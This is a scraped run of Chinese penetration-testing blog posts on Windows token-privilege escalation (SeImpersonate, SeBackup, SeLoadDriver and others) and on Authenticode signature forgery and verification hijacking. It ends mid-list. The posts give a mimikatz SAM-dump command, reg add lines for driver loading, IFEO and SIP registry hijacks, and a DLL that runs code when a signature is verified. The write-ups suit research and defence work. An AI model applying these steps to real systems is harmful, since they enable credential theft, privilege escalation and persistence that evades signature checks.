<p>https://github.com/jschicht/MftCarver</p>

<p>Joakim Schicht的github有很多取证的工具值得参考:</p>

<p>https://github.com/jschicht/</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了NTFS文件的USN Journal的利用思路，给出取证上的建议。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January  4, 2019
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows Token九种权限的利用</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/">《渗透技巧——从Admin权限切换到System权限》</a>和<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/">《渗透技巧——Token窃取与利用》</a>分别介绍了从admin权限切换到system权限和TrustedInstaller权限的方法，其中的主要方法是利用token切换权限。</p>

<p>那么，普通用户(或者LocalService用户)的特殊Token有哪些可利用方法呢？能否提权？如何判断？</p>

<p>本文将要结合自己的经验，参考多个开源工具和资料，尝试对这个技巧做总结，分享学习心得</p>

<p>参考的开源工具和资料：</p>

<ul>
  <li>Hot Potato： https://github.com/foxglovesec/Potato</li>
  <li>powershell版本Hot Potato： https://github.com/Kevin-Robertson/Tater</li>
  <li>Rotten Potato： https://github.com/breenmachine/RottenPotatoNG</li>
  <li>lonelypotato： https://github.com/decoder-it/lonelypotato</li>
  <li>Juicy Potato： https://github.com/ohpe/juicy-potato</li>
  <li>https://github.com/hatRiot/token-priv</li>
  <li>https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/</li>
  <li>https://foxglovesecurity.com/2016/01/16/hot-potato/</li>
  <li>https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/</li>
  <li>https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/</li>
</ul>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>简要利用思路</li>
  <li>SeImpersonatePrivilege权限对应的利用思路和开源代码</li>
  <li>SeAssignPrimaryPrivilege权限对应的利用思路和开源代码</li>
  <li>SeTcbPrivilege权限对应的利用思路和开源代码</li>
  <li>SeBackupPrivilege权限对应的利用思路和开源代码</li>
  <li>SeRestorePrivilege权限对应的利用思路和开源代码</li>
  <li>SeCreateTokenPrivilege权限对应的利用思路和开源代码</li>
  <li>SeLoadDriverPrivilege权限对应的利用思路和开源代码</li>
  <li>SeTakeOwnershipPrivilege权限对应的利用思路和开源代码</li>
  <li>SeDebugPrivilege权限对应的利用思路和开源代码</li>
</ul>

<h2 id="0x02-简要利用思路">0x02 简要利用思路</h2>
<hr>

<h3 id="1取得了目标的访问权限后查看可用权限">1、取得了目标的访问权限后，查看可用权限</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /priv
</code></pre></div></div>

<p>例如，普通用户具有的权限如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-1/2-1.png" alt="Alt text"></p>

<p>管理员用户具有的权限如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-1/2-2.png" alt="Alt text"></p>

<p>iis用户具有的权限如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-1/2-3.png" alt="Alt text"></p>

<p>Privilege Name项表示具有的权限，State表示权限的状态，我们可以通过WinAPI AdjustTokenPrivileges将权限设置为Disabled或者Enabled</p>

<p>可供参考的实现代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnablePrivilegeandGetTokenInformation.cpp</p>

<p>代码实现了开启指定权限(SeDebugPrivilege)，并且查看当前用户名称和具有的权限</p>

<h3 id="2如果包含以下九个权限我们就可以对其进一步利用">2、如果包含以下九个权限，我们就可以对其进一步利用</h3>

<ul>
  <li>SeImpersonatePrivilege</li>
  <li>SeAssignPrimaryPrivilege</li>
  <li>SeTcbPrivilege</li>
  <li>SeBackupPrivilege</li>
  <li>SeRestorePrivilege</li>
  <li>SeCreateTokenPrivilege</li>
  <li>SeLoadDriverPrivilege</li>
  <li>SeTakeOwnershipPrivilege</li>
  <li>SeDebugPrivilege</li>
</ul>

<p><strong>注：</strong></p>

<p>iis或者sqlserver的用户通常具有SeImpersonatePrivilege和SeAssignPrimaryPrivilege权限</p>

<p>Backup service用户通常具有SeBackupPrivilege和SeRestorePrivilege权限</p>

<h2 id="0x03-seimpersonateprivilege权限的利用思路">0x03 SeImpersonatePrivilege权限的利用思路</h2>
<hr>

<p>参考资料：</p>

<p>https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt#L327</p>

<h3 id="seimpersonateprivilege">SeImpersonatePrivilege</h3>

<p>身份验证后模拟客户端(Impersonatea client after authentication)</p>

<p>拥有该权限的进程能够模拟已有的token，但不能创建新的token</p>

<p>以下用户具有该权限：</p>

<ul>
  <li>本地管理员组成员和本地服务帐户</li>
  <li>由服务控制管理器启动的服务</li>
  <li>由组件对象模型 (COM) 基础结构启动的并配置为在特定帐户下运行的COM服务器</li>
</ul>

<p>通常，iis或者sqlserver用户具有该权限</p>

<h3 id="利用思路">利用思路</h3>

<ol>
  <li>
    <p>利用NTLM Relay to Local Negotiation获得System用户的Token
可使用开源工具Rotten Potato、lonelypotato或者Juicy Potato</p>
  </li>
  <li>
    <p>通过WinAPI CreateProcessWithToken创建新进程，传入System用户的Token
具有SeImpersonatePrivilege权限才能创建成功</p>
  </li>
  <li>
    <p>该Token具有System权限</p>
  </li>
</ol>

<p>可供参考的测试代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeImpersonatePrivilege.cpp</p>

<p>代码实现了开启当前进程的SeImpersonatePrivilege权限，调用CreateProcessWithToken，传入当前进程的Token，创建一个进程，配合RottenPotato，可用来从LocalService提权至System权限</p>

<h2 id="0x04-seassignprimaryprivilege权限的利用思路">0x04 SeAssignPrimaryPrivilege权限的利用思路</h2>
<hr>

<p>参考资料：</p>

<p>https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt#L359</p>

<h3 id="seassignprimaryprivilege">SeAssignPrimaryPrivilege</h3>

<p>向进程(新创建或者挂起的进程)分配token</p>

<p>通常，iis或者sqlserver用户具有该权限</p>

<h3 id="利用思路1">利用思路1</h3>

<ol>
  <li>利用NTLM Relay to Local Negotiation获得System用户的Token</li>
  <li>通过WinAPI CreateProcessAsUser创建新进程，传入System用户的Token</li>
  <li>该Token具有System权限</li>
</ol>

<p>可供参考的测试代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeAssignPrimaryTokenPrivilege.cpp</p>

<p>代码实现了开启当前进程的SeAssignPrimaryTokenPrivilege权限，调用CreateProcessAsUser，传入当前进程的Token，创建一个进程，配合RottenPotato，可用来从LocalService提权至System权限</p>

<h3 id="利用思路2">利用思路2</h3>

<ol>
  <li>利用NTLM Relay to Local Negotiation获得System用户的Token</li>
  <li>通过WinAPI CreateProcess创建一个挂起的新进程，参数设置为CREATE_SUSPENDED</li>
  <li>通过WinAPI NtSetInformationProcess将新进程的Token替换为System用户的Token</li>
  <li>该Token具有System权限</li>
</ol>

<h2 id="0x05-setcbprivilege权限的利用思路">0x05 SeTcbPrivilege权限的利用思路</h2>
<hr>

<p>参考资料：</p>

<p>https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt#L418</p>

<h3 id="setcbprivilege">SeTcbPrivilege</h3>

<p>等同于获得了系统的最高权限</p>

<h3 id="利用思路-1">利用思路</h3>

<ol>
  <li>调用LsaLogonUser获得Token</li>
  <li>将该Token添加至Local System account组</li>
  <li>该Token具有System权限</li>
</ol>

<p>可供参考的测试代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeTcbPrivilege.cpp</p>

<p>代码实现了开启当前进程的SeTcbPrivilege权限，登录用户test1,将其添加至Local System account组，获得System权限，创建注册表项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\testtcb</code></p>

<h2 id="0x06-sebackupprivilege权限的利用思路">0x06 SeBackupPrivilege权限的利用思路</h2>
<hr>

<p>参考资料：</p>

<p>https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt#L495</p>

<h3 id="sebackupprivilege">SeBackupPrivilege</h3>

<p>用来实现备份操作，对当前系统任意文件具有读权限</p>

<h3 id="利用思路-2">利用思路</h3>

<ol>
  <li>读取注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM</code>、<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SECURITY</code>和<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM</code></li>
  <li>导出当前系统的所有用户hash
mimikatz的命令如下：</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv
</code></pre></div></div>

<p>可供参考的测试代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeBackupPrivilege.cpp</p>

<p>代码实现了开启当前进程的SeBackupPrivilege权限，读取注册表，将其保存成文件<code class="language-plaintext highlighter-rouge">C:\\test\\SAM</code>、<code class="language-plaintext highlighter-rouge">C:\\test\\SECURITY</code>和<code class="language-plaintext highlighter-rouge">C:\\test\\SYSTEM</code></p>

<h2 id="0x07-serestoreprivilege权限的利用思路">0x07 SeRestorePrivilege权限的利用思路</h2>
<hr>

<p>参考资料：</p>

<p>https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt#L528</p>

<h3 id="serestoreprivilege">SeRestorePrivilege</h3>

<p>用来实现恢复操作，对当前系统任意文件具有写权限</p>

<h3 id="利用思路1-1">利用思路1</h3>

<ol>
  <li>获得SeRestorePrivilege权限，修改注册表<code class="language-plaintext highlighter-rouge">HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Image File Execution Options</code></li>
  <li>劫持exe文件的启动</li>
  <li>实现提权或是作为后门</li>
</ol>

<h3 id="利用思路2-1">利用思路2</h3>

<ol>
  <li>获得SeRestorePrivilege权限，向任意路径写入dll文件</li>
  <li>实现dll劫持</li>
  <li>实现提权或是作为后门</li>
</ol>

<p>可供参考的测试代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeRestorePrivilege.cpp</p>

<p>代码实现了开启当前进程的SeRestorePrivilege权限，创建注册表项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\testrestore</code></p>

<h2 id="0x08-secreatetokenprivilege权限的利用思路">0x08 SeCreateTokenPrivilege权限的利用思路</h2>
<hr>

<p>参考资料：</p>

<p>https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt#L577</p>

<h3 id="secreatetokenprivilege">SeCreateTokenPrivilege</h3>

<p>用来创建Primary Token</p>

<h3 id="利用思路-3">利用思路</h3>

<ol>
  <li>通过WinAPI ZwCreateToken创建Primary Token</li>
  <li>将Token添加至local administrator组</li>
  <li>该Token具有System权限</li>
</ol>

<p>可供参考的测试代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeCreateTokenPrivilege.cpp</p>

<p>代码实现了开启当前进程的SeCreateTokenPrivilege权限，创建Primary Token，将其添加至local administrator组，开启SeDebugPrivilege和SeTcbPrivilege权限</p>

<h2 id="0x09-seloaddriverprivilege权限的利用思路">0x09 SeLoadDriverPrivilege权限的利用思路</h2>
<hr>

<p>参考资料：</p>

<p>https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt#L626</p>

<h3 id="seloaddriverprivilege">SeLoadDriverPrivilege</h3>

<p>用来加载驱动文件</p>

<h3 id="利用思路-4">利用思路</h3>

<ol>
  <li>创建驱动文件的注册表</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hkcu\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys"
reg add hkcu\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
</code></pre></div></div>

<ol>
  <li>加载驱动文件Capcom.sys</li>
  <li>
    <p>Capcom.sys存在漏洞，系统加载后，可从普通用户权限提升至System权限，利用代码可参考：
https://github.com/tandasat/ExploitCapcom</p>
  </li>
  <li>获得System权限</li>
</ol>

<p>可供参考的测试代码：
https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp</p>

<p>代码实现了开启当前进程的SeLoadDriverPrivilege权限，读取注册表项<code class="language-plaintext highlighter-rouge">hkcu\System\CurrentControlSet\CAPCOM</code>，加载驱动文件<code class="language-plaintext highlighter-rouge">Capcom.sys</code></p>

<h2 id="0x0a-setakeownershipprivilege权限的利用思路">0x0A SeTakeOwnershipPrivilege权限的利用思路</h2>
<hr>

<p>参考资料：</p>

<p>https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt#L688</p>

<h3 id="setakeownershipprivilege">SeTakeOwnershipPrivilege</h3>

<p>同SeRestorePrivilege类似，对当前系统任意文件具有写权限</p>

<h3 id="利用思路1-2">利用思路1</h3>

<ol>
  <li>获得SeTakeOwnershipPrivilege权限，修改注册表<code class="language-plaintext highlighter-rouge">HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Image File Execution Options</code></li>
  <li>劫持exe文件的启动</li>
  <li>实现提权或是作为后门</li>
</ol>

<h3 id="利用思路2-2">利用思路2</h3>

<ol>
  <li>获得SeTakeOwnershipPrivilege权限，向任意路径写入dll文件</li>
  <li>实现dll劫持</li>
  <li>实现提权或是作为后门</li>
</ol>

<p>可供参考的测试代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeTakeOwnershipPrivilege.cpp</p>

<p>代码实现了开启当前进程的SeTakeOwnershipPrivilege权限，修改注册表项<code class="language-plaintext highlighter-rouge">hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>的权限，普通用户权限对其具有完整操作权限</p>

<p>后续的写操作：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /v takeownership /t REG_SZ /d "C:\\Windows\\System32\\calc.exe"
</code></pre></div></div>

<h2 id="0x0b-sedebugprivilege权限的利用思路">0x0B SeDebugPrivilege权限的利用思路</h2>
<hr>

<p>参考资料：</p>

<p>https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt#L736</p>

<h3 id="sedebugprivilege">SeDebugPrivilege</h3>

<p>用来调试指定进程，包括读写内存，常用作实现dll注入</p>

<h3 id="利用思路-5">利用思路</h3>

<ol>
  <li>找到System权限的进程</li>
  <li>dll注入</li>
  <li>获得System权限</li>
</ol>

<p>可供参考的测试代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeDebugPrivilege.cpp</p>

<p>代码实现了开启当前进程的SeDebugPrivilege权限，向指定进程注入dll</p>

<h2 id="0x0c-小结">0x0C 小结</h2>
<hr>

<p>本文总结了普通用户(或者LocalService用户)Token中九种权限的利用方法，分析利用思路，完善实现代码</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September  1, 2018
  </div>

  
</article><article class="post">
  <h1>Authenticode签名伪造——PE文件的签名伪造与签名验证劫持</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上一篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/CAT%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/">《CAT文件数字签名使用技巧》</a>介绍了证书签名的基础知识，Windows系统下向文件签名有两种方法：添加在文件末尾(Authenticode)和CAT文件(catalog)，本文将介绍Authenticode签名的相关利用技巧——PE文件的签名伪造与签名验证劫持</p>

<p><strong>注：</strong></p>

<p>本文介绍的技巧参考自Matt Graeber@mattifestation公开的资料，本文将结合自己的经验，整理相关内容，添加个人理解。</p>

<p><strong>参考资料：</strong></p>

<p>https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf</p>

<p>http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html</p>

<p>https://drive.google.com/file/d/0B-K55rLoulAfNms1aW1rbXF1Tmc/view</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>
<ul>
  <li>PE文件的Authenticode签名伪造</li>
  <li>劫持签名验证过程，实现代码执行，作为后门</li>
</ul>

<h2 id="0x02-pe文件的签名伪造">0x02 PE文件的签名伪造</h2>
<hr>

<p>Authenticode的详细说明文档可参考：</p>

<p>http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Authenticode_PE.docx</p>

<p>部分系统文件会包含微软的签名，例如<code class="language-plaintext highlighter-rouge">C:\Windows\System32\consent.exe</code></p>

<p>通过文件属性能够看到相关签名信息，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-1.png" alt="Alt text"></p>

<p>通过powershell验证，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature C:\Windows\System32\consent.exe
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-2.png" alt="Alt text"></p>

<p>借助工具CFF Explorer获取文件结构，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-3.png" alt="Alt text"></p>

<p>Security Directory RVA代码数字签名在PE文件中的偏移位置
Security DirectorySize代表数字签名的长度</p>

<p>将这部分内容提取，复制到另一个文件test.exe的尾部，同时使用<code class="language-plaintext highlighter-rouge">CFF Explorer</code>修改test.exe对应的<code class="language-plaintext highlighter-rouge">Security Directory RVA</code>和<code class="language-plaintext highlighter-rouge">Security DirectorySize</code></p>

<p>这样，就实现了数字签名的伪造</p>

<p>开源工具SigThief可自动实现以上过程，地址如下：</p>

<p>https://github.com/secretsquirrel/SigThief</p>

<h3 id="实际测试">实际测试：</h3>

<p>测试系统： Win7</p>

<p>将<code class="language-plaintext highlighter-rouge">C:\Windows\System32\consent.exe</code>的数字签名复制到mimikatz.exe中</p>

<p>参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigthief.py -i C:\Windows\System32\consent.exe -t mimikatz.exe -o si.exe 
</code></pre></div></div>

<p>生成si.exe，具有微软数字签名，但提示证书无效，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-4.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>部分测试系统无法使用sigthief.py，提示找不到0x9，将系统激活即可</p>

<p>通过powershell验证，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\si.exe
</code></pre></div></div>

<p>显示HashMismatch，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-5.png" alt="Alt text"></p>

<p>通过signtool.exe验证：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool.exe verify /v si.exe
</code></pre></div></div>

<p>显示<code class="language-plaintext highlighter-rouge">SignTool Error: WinVerifyTrust returned error: 0x80096010</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-6.png" alt="Alt text"></p>

<p>通过sigcheck.exe验证：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck.exe -q si.exe
</code></pre></div></div>

<p>显示<code class="language-plaintext highlighter-rouge">The digital signature of the object did not verify</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-7.png" alt="Alt text"></p>

<h2 id="0x03-修改配置使签名通过验证">0x03 修改配置，使签名通过验证</h2>
<hr>

<p>查看<code class="language-plaintext highlighter-rouge">Get-AuthenticodeSignature</code>的帮助说明：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Help Get-AuthenticodeSignature -Full 
</code></pre></div></div>

<p>查看相关操作<code class="language-plaintext highlighter-rouge">Set-AuthenticodeSignature</code>的帮助说明：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Help Set-AuthenticodeSignature -Full
</code></pre></div></div>

<p>发现该命令的功能：</p>

<blockquote>
  <p>The Set-AuthenticodeSignature cmdlet adds an Authenticode signature to
any file that supports Subject Interface Package (SIP).</p>
</blockquote>

<p>关于SIP的资料，可参考：</p>

<p>https://blogs.technet.microsoft.com/eduardonavarro/2008/07/11/sips-subject-interface-package-and-authenticode/</p>

<p>获得有用的信息：</p>

<blockquote>
  <p>There are some included as part of the OS (at least on Vista). Locate
in the %WINDIR%\System32 directory. They usually have a naming ending
with sip.dll, i.e. msisip.dll is the Microsoft Installer (.msi) SIP.</p>
</blockquote>

<p>寻找Windows下的SIP:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls C:\Windows\System32\*sip.dll -Recurse -ErrorAction SilentlyContinue
</code></pre></div></div>

<p>Win7下只有一个：<code class="language-plaintext highlighter-rouge">C:\Windows\System32\msisip.dll</code></p>

<p><strong>注：</strong></p>

<p>Matt Graeber的测试系统为Win10，可以找到多个dll</p>

<p>使用IDA打开该dll，查看函数<code class="language-plaintext highlighter-rouge">DllRegisterServer()</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-1.png" alt="Alt text"></p>

<p>找到一个特别的名称MsiSIPVerifyIndirectData，字面意思像是签名验证功能</p>

<p>查找资料，找到该函数，地址如下：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/cc542591%28v=vs.85%29.aspx</p>

<p>发现该函数，返回TRUE代表验证成功，返回FALSE代表验证失败</p>

<p>该功能对应注册表键值，位置如下：</p>

<p><code class="language-plaintext highlighter-rouge">HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-2.png" alt="Alt text"></p>

<p>不同GUID对应不同文件格式的验证，例如：</p>

<ul>
  <li>C689AAB8-8E78-11D0-8C47-00C04FC295EE - PE</li>
  <li>DE351A43-8E59-11D0-8C47-00C04FC295EE - catalog	.cat文件</li>
  <li>9BA61D3F-E73A-11D0-8CD2-00C04FC295EE - CTL 		.ctl文件</li>
  <li>C689AABA-8E78-11D0-8C47-00C04FC295EE - cabinet 	.cab文件</li>
</ul>

<p><strong>注：</strong></p>

<p>GUID说明引用自<a href="https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf">《Subverting Trust in Windows》</a> Page4</p>

<p>接下来，尝试替换<code class="language-plaintext highlighter-rouge">HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}</code>下的dll和FuncName</p>

<p>通过c++实现，创建dll，添加导出函数，格式参照<code class="language-plaintext highlighter-rouge">CryptSIPVerifyIndirectData</code>，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL WINAPI CryptSIPVerifyIndirectData(SIP_SUBJECTINFO *pSubjectInfo, SIP_INDIRECT_DATA *pIndirectData)
{
	return TRUE;
}
</code></pre></div></div>

<p>编译生成signtest.dll</p>

<p>修改注册表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\signtest.dll" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "CryptSIPVerifyIndirectData" /f
</code></pre></div></div>

<p>重新启动cmd，使用powershell进行验证：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\si.exe
</code></pre></div></div>

<p>显示Valid，校验成功</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-3.png" alt="Alt text"></p>

<p>通过signtool.exe验证：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool.exe verify /v si.exe
</code></pre></div></div>

<p>验证通过</p>

<p>通过sigcheck.exe验证：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck.exe -q si.exe
</code></pre></div></div>

<p>验证通过，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-4.png" alt="Alt text"></p>

<p>重启explorer.exe，查看文件属性，签名状态，显示签名生效，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-5.png" alt="Alt text"></p>

<p>更进一步，<strong>dll一定要固定格式吗？</strong></p>

<p>于是进行接下来的测试：</p>

<p>导出函数名为test1，完整代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}
BOOL WINAPI test1() 
{
	return TRUE;
}
</code></pre></div></div>

<p>修改对应注册表键值：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\signtest.dll" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "test1" /f
</code></pre></div></div>

<p>测试仍能够绕过验证</p>

<p>这就说明，只要dll的导出函数返回TRUE，就能够绕过验证</p>

<p>所以，可以查找系统默认的dll，找到一个导出函数返回true即可（当然，此处可供利用的导出函数有很多）</p>

<p>例如<code class="language-plaintext highlighter-rouge">"C:\Windows\System32\ntdll.dll" </code></p>

<p>导出函数：<code class="language-plaintext highlighter-rouge">DbgUiContinue</code></p>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "DbgUiContinue" /f
</code></pre></div></div>

<p>这样，就不需要在系统上留下自己编写的dll</p>

<p>对于64位系统，存在32位的注册表键值</p>

<p>如果使用32位的程序，如32位的signtool和sigcheck，为了绕过验证，还需要修改32位的注册表键值，对应代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Wow6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f

REG ADD "HKLM\SOFTWARE\Wow6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "DbgUiContinue" /f
</code></pre></div></div>

<h2 id="0x04-签名验证劫持">0x04 签名验证劫持</h2>
<hr>

<p>修改注册表，编写dll实现对签名验证过程的绕过，如果我们在dll的导出函数里面加入自己的代码，这就实现了签名验证劫持</p>

<p>在签名验证中加入执行代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}
BOOL WINAPI test1() 
{
	WinExec("calc.exe",SW_SHOWNORMAL);
	return TRUE;
}
</code></pre></div></div>

<p>只要涉及签名验证的操作，加载我们自己的dll，就会弹出计算器</p>

<p>以下程序会使用签名验证操作：</p>

<ul>
